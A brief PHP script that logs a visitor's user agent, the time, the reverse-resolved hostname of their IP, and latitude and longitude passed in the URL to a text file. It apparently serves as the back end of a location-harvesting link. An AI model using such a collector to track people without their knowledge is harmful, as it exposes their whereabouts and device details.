<?php
date_default_timezone_set("Asia/Dhaka");
$myfile = fopen("data.txt", "a");
$txt = "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n" . "Time: " . date("h:i:sa") . "\n" .  "Host: " . gethostbyaddr($_SERVER["REMOTE_ADDR"]) . "\n" .  "Latitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . "\n\n\n";
fwrite($myfile, $txt);
fclose($myfile);

?>
